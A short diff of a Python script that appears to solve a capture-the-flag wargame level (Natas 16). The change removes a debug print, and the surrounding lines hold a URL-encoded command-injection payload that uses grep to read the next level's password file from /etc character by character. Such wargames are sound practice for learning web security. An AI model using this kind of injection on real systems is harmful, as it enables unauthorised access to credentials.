@@ -20,7 +20,6 @@ length = 32
 position = '' 
 
 for c in range(0,length): #loop for each character in the password
-    print(position)
     for i in range(48,123): #loop for each possible ascii character (48-123 contains all upper/lowercase letters, and digits)
         payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(position, i)
         
